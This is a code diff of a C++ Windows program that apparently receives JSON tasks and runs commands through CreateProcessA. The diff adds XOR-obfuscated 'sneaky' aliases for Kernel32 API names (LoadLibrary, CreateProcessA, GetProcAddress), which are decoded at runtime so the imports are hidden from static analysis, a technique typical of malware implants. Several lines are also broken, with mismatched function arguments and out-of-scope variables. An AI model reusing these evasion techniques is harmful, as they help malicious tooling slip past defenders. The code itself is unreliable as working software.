@@ -12,26 +12,66 @@ using json = nlohmann::json;
 void task_do(json task);
 void task_dispatcher(char * body);
 
-/* example of how to obfuscate*/
-void tester(){
-     HMODULE hModule = LoadLibraryA("User32.dll");
-    if( hModule == NULL){
-        printf("Failed to get handle to User32.dll Because of %d\n", GetLastError());
-       
-    }
-    _CreateProcessA f = NULL;
-    std::string s = std::string("zK\\XM\\iKVZ\\JJx");
+/* declare all library names*/
+std::string AliasK32;
+
+
+/* declare all sneaky names*/
+std::string AliasLoadLib;
+std::string AliasCreateProcA;
+std::string AliasSleep;
+std::string AliasGetProcA;
+std::string AliasFreeLib;
+std::string AliasGetStartInfo;
+
+void InitStrings(){
+AliasK32 = std::string("r\\KW\\U\n♂↨]UU");
+AliasLoadLib = std::string("uVX]uP[KXK@x");
+AliasCreateProcA = std::string("zK\\XM\\iKVZ\\JJx");
+AliasSleep = std::string("jU\\\\I");
+AliasGetProcA = std::string("~\\MiKVZx]]K\\JJ");
+AliasFreeLib = std::string("⌂K\\\\uP[KXK@");
+AliasGetStartInfo =std::string( "~\\MjMXKMLIpW_Vx");
+}
+
+int getModuleEncry(std::string s,HMODULE hModule){
     char buf[s.size()];
     s.copy(buf, s.size(), 0);
-    encryptDecrypt(buf);
+    hide(buf);
     LPCSTR exp = buf; 
-    printf("%s", exp);
+    hModule = LoadLibraryA(exp);
+    if( hModule == NULL){
+        printf("Failed to get handle to Kernel32.dll Because of %d\n", GetLastError());
+        return -1;
+    }
+    return 0;
+}
+
+FARPROC getProcAEncry(std::string s, FARPROC a, HMODULE hModule){
+    char buf[s.size()];
+    s.copy(buf, s.size(), 0);
+    hide(buf);
+    LPCSTR exp = buf; 
+    a = GetProcAddress(hModule, exp);
+    return 0;
+}
+
+void tester(){
+    HMODULE hModule;
+    getModuleEncry(AliasK32, hModule);
+    _CreateProcessA f = NULL;
+    FARPROC a;
+    if (hModule != NULL){
+        getProcAEncry(a, hModule);
+    }
+    
     if (hModule != NULL){
         f = (_CreateProcessA)(GetProcAddress(hModule, exp));
     }
     FreeLibrary(hModule);
-
 }
+
+
 /* main execute function*/
 char * execute(char * program, char *args, char* outfile){
      LPSTR cmdBuffer = (char *)malloc(1000 * sizeof(char));
@@ -65,7 +105,12 @@ char * execute(char * program, char *args, char* outfile){
     }
     printf("after loading\n");
     _CreateProcessA f = NULL;
-    LPCSTR exp = hide("zK\\XM\\iKVZ\\JJx"); 
+    std::string s = std::string("zK\\XM\\iKVZ\\JJx");
+    char buf[s.size()];
+    s.copy(buf, s.size(), 0);
+    hide(buf);
+    LPCSTR exp = buf; 
+    //LPCSTR exp = hide("zK\\XM\\iKVZ\\JJx"); 
     printf("%s", exp);
     if (hModule != NULL){
         f = (_CreateProcessA)(GetProcAddress(hModule, "CreateProcessA"));
